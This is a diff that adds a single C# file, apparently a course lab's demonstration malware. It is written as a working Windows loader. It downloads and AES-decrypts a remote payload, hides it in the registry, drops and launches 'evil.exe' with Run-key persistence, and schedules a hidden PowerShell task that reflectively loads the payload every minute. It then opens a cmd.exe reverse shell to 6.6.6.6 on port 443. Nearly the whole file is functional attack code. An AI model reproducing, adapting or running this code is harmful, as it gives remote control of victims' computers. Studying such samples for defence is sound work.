@@ -1,0 +1,235 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Cache;
+using System.Net.Sockets;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Runtime.Versioning;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using Microsoft.Win32;
+
+[assembly: CompilationRelaxations(8)]
+[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
+[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
+[assembly: AssemblyTitle("ThereIsNothingToSee")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("Showcase")]
+[assembly: AssemblyProduct("Innocent")]
+[assembly: AssemblyCopyright("Showcase")]
+[assembly: AssemblyTrademark("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("12b739f7-2355-491e-a3cd-a8485d39d6d6")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+[assembly: TargetFramework(".NETFramework,Version=v4.0", FrameworkDisplayName = ".NET Framework 4")]
+[assembly: AssemblyVersion("1.0.0.0")]
+namespace Innocent
+{
+       internal class TakeThis
+       {
+              private static StreamWriter streamWriter;
+
+              private static void Main()
+              {
+              byte[] array = DownloadPayload(Encoding.Unicode.GetString(Convert.FromBase64String("aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBvAHUAcwBwAGcALwBDAG8AbQBwAFMAZQBjAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAEwAYQBiADMAXwBCAG8AdABuAGUAdABzAF8AYQBuAGQAXwBtAGEAbAB3AGEAcgBlAC8AbQBpAHMAYwAvAG0AYQBsAHcAYQByAGUALwBiAG8AbwBtAC4AZQBuAGMAcgB5AHAAdABlAGQA")));
+              byte[] iV = StringToByteArray("222503488E34D554B0FEC555FA4A9569");
+              byte[] key = StringToByteArray("B672EA3A555CB91998DE696C2304E4DF464765396E7D9D4CF6BA65ECB7E1324C");
+              byte[] array2 = new byte[array.Length];
+              Buffer.BlockCopy(array, 0, array2, 0, array2.Length);
+              using (SHA256.Create())
+              {
+                     InstallRegistry(DecryptStringFromBytes_Aes(array2, key, iV));
+              }
+              RunPayload(GetPayloadFromRegistry(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\evil.exe");
+              AddToSchtasks();
+              LaunchCommandLineApp();
+              }
+
+              public static byte[] StringToByteArray(string hex)
+              {
+              int length = hex.Length;
+              byte[] array = new byte[length / 2];
+              for (int i = 0; i < length; i += 2)
+              {
+                     array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+              }
+              return array;
+              }
+
+              private static byte[] GetPayloadFromRegistry()
+              {
+              using MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(Registry.CurrentUser.OpenSubKey("Software\\evil", writable: true).GetValue("Payload").ToString()));
+              return memoryStream.ToArray();
+              }
+
+              private static bool InstallPayload(string dropPath)
+              {
+              if (!Process.GetCurrentProcess().MainModule.FileName.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
+              {
+                     FileStream fileStream = null;
+                     try
+                     {
+                            fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
+                            byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
+                            fileStream.Write(array, 0, array.Length);
+                            fileStream.Dispose();
+                            Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(dropPath), dropPath);
+                            Process.Start(dropPath);
+                            return true;
+                     }
+                     catch
+                     {
+                            return false;
+                     }
+              }
+              return false;
+              }
+
+              private static void RunPayload(byte[] payload, string dropPath)
+              {
+              Thread thread = new Thread((ThreadStart)delegate
+              {
+                     FileStream fileStream = null;
+                     try
+                     {
+                            fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
+                            fileStream.Write(payload, 0, payload.Length);
+                            fileStream.Dispose();
+                            Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(dropPath), dropPath);
+                            Process.Start(dropPath);
+                     }
+                     catch
+                     {
+                     }
+              });
+              thread.IsBackground = false;
+              thread.Start();
+              }
+
+              private static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
+              {
+              if (cipherText == null || cipherText.Length == 0)
+              {
+                     throw new ArgumentNullException("cipherText");
+              }
+              if (Key == null || Key.Length == 0)
+              {
+                     throw new ArgumentNullException("Key");
+              }
+              if (IV == null || IV.Length == 0)
+              {
+                     throw new ArgumentNullException("IV");
+              }
+              string text = null;
+              using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
+              aesCryptoServiceProvider.Key = Key;
+              aesCryptoServiceProvider.IV = IV;
+              aesCryptoServiceProvider.Mode = CipherMode.CBC;
+              aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
+              ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
+              using MemoryStream stream = new MemoryStream(cipherText);
+              using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
+              using StreamReader streamReader = new StreamReader(stream2);
+              return streamReader.ReadToEnd();
+              }
+
+              private static byte[] DownloadPayload(string url)
+              {
+              using WebClient webClient = new WebClient();
+              ServicePointManager.Expect100Continue = true;
+              ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+              webClient.CachePolicy = new RequestCachePolicy(RequestCacheLevel.BypassCache);
+              webClient.Headers.Add("Cache-Control", "no-cache");
+              webClient.Encoding = Encoding.UTF8;
+              return new MemoryStream(webClient.DownloadData(url)).ToArray();
+              }
+
+              private static void InstallRegistry(string Payload)
+              {
+              RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\evil", writable: true);
+              if (registryKey == null)
+              {
+                     registryKey = Registry.CurrentUser.CreateSubKey("Software\\evil");
+                     registryKey.SetValue("Payload", Payload);
+              }
+              else if (registryKey.GetValue("Payload") == null || !registryKey.GetValue("Payload").ToString().Equals(Payload, StringComparison.CurrentCultureIgnoreCase))
+              {
+                     registryKey.SetValue("Payload", Payload);
+              }
+              }
+
+              private static void LaunchCommandLineApp()
+              {
+              ProcessStartInfo processStartInfo = new ProcessStartInfo();
+              processStartInfo.CreateNoWindow = false;
+              processStartInfo.UseShellExecute = false;
+              processStartInfo.FileName = "explorer";
+              processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+              processStartInfo.Arguments = "\"https://i.redd.it/2ialma4xoiv41.jpg\"";
+              try
+              {
+                     using Process process = Process.Start(processStartInfo);
+                     process.WaitForExit();
+              }
+              catch
+              {
+              }
+              using TcpClient tcpClient = new TcpClient("6.6.6.6", 443);
+              using Stream stream = tcpClient.GetStream();
+              using StreamReader streamReader = new StreamReader(stream);
+              streamWriter = new StreamWriter(stream);
+              StringBuilder stringBuilder = new StringBuilder();
+              Process process2 = new Process();
+              process2.StartInfo.FileName = "cmd.exe";
+              process2.StartInfo.CreateNoWindow = true;
+              process2.StartInfo.UseShellExecute = false;
+              process2.StartInfo.RedirectStandardOutput = true;
+              process2.StartInfo.RedirectStandardInput = true;
+              process2.StartInfo.RedirectStandardError = true;
+              process2.OutputDataReceived += CmdOutputDataHandler;
+              process2.Start();
+              process2.BeginOutputReadLine();
+              while (true)
+              {
+                     stringBuilder.Append(streamReader.ReadLine());
+                     process2.StandardInput.WriteLine(stringBuilder);
+                     stringBuilder.Remove(0, stringBuilder.Length);
+              }
+              }
+
+              private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+              {
+              StringBuilder stringBuilder = new StringBuilder();
+              if (!string.IsNullOrEmpty(outLine.Data))
+              {
+                     try
+                     {
+                            stringBuilder.Append(outLine.Data);
+                            streamWriter.WriteLine(stringBuilder);
+                            streamWriter.Flush();
+                     }
+                     catch (Exception)
+                     {
+                     }
+              }
+              }
+
+              private static void AddToSchtasks()
+              {
+              string text = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\evil\\).Payload)).EntryPoint.Invoke($Null,$Null)";
+              Process.Start(new ProcessStartInfo
+              {
+                     FileName = "schtasks",
+                     Arguments = "/create /sc minute /mo 1 /tn LimeLoader /tr \"" + text + "\"",
+                     CreateNoWindow = true,
+                     ErrorDialog = false,
+                     WindowStyle = ProcessWindowStyle.Hidden
+              });
+              }
+       }
+}
